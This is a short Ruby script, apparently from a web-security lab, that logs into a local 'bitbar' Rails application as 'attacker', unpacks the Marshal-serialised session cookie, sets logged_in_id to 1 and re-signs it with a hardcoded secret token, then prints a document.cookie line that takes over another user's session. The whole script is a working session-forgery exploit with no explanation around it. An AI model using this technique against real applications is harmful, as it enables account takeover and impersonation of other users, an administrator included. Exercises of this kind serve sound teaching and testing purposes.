#!/usr/bin/env ruby

require 'mechanize'
require 'base64'
# require 'Marshal'

agent = Mechanize.new
page = agent.get "http://localhost:3000/login"

form = page.forms.first
form['username'] = 'attacker'
form['password'] = 'attacker'
results = agent.submit(form)

cookie = agent.cookie_jar.jar
encrypted = cookie["localhost"]["/"]["_bitbar_session"].to_s
encrypted = URI.unescape(encrypted)
encrypted = encrypted.split("=")[1].split("--")[0]

decoded = Base64.decode64(encrypted)
decoded = Marshal.load(decoded)
decoded["logged_in_id"] = 1

encoded = Marshal.dump(decoded)
encoded = Base64.encode64(encoded)

secretToken = "0a5bfbbb62856b9781baa6160ecfd00b359d3ee3752384c2f47ceb45eada62f24ee1cbb6e7b0ae3095f70b0a302a2d2ba9aadf7bc686a49c8bac27464f9acb08"
temp = OpenSSL::HMAC.hexdigest(OpenSSL::Digest.const_get('SHA1').new, secretToken, encoded)
encoded = "_bitbar_session=" + encoded + "--" + temp
encoded = URI.escape(encoded)

puts "document.cookie=\"" + encoded + "\";"


